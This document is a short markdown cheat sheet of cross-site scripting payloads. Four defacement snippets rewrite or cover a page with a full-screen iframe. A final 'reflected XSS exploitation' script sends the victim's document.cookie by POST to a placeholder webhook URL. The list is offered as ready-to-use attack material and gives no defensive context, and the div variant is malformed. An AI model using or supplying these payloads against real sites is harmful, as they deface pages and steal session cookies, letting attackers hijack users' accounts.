# XSS Payloads

## XSS Defacement Payloads

### XSS Script Payload
List of XSS payloads

```
<script>document.documentElement.innerHTML="<html><iframe src='https://example.com' style='visibility: visible; border: 0; position: fixed; top: 0; right: 0; left: 0; bottom: 0; width: 100%; height: 100%;'></iframe></html>";</script>
```
### XSS Div Payload
```
<div onload="<script>document.documentElement.innerHTML="<html><iframe src='https://example.com' style='visibility: visible; border: 0; position: fixed; top: 0; right: 0; left: 0; bottom: 0; width: 100%; height: 100%;'></iframe></html>";</script>"></div>
```
### XSS Iframe Payload
```
<iframe src="https://example.com" style="border: 0; position: fixed; top: 0; right: 0; left: 0; bottom: 0; width: 100%; height: 100%;"></iframe>
```
### XSS SVG Payload
```
<svg width="100%" height="100%" style="position: fixed; top: 0; right: 0; bottom: 0; left: 0;"> <foreignObject width="100%" height="100%"> <body xmlns="http://www.w3.org/1999/xhtml"> <iframe src="https://example.com" style="border: 0; width: 100%; height: 100%;"></iframe> </body> </foreignObject> </svg>
```

## Reflected XSS Exploitation Payloads
```
<script> fetch('WEBHOOK.SITE URL HERE', { method: 'POST', mode: 'no-cors', body:document.cookie }); </script>
```
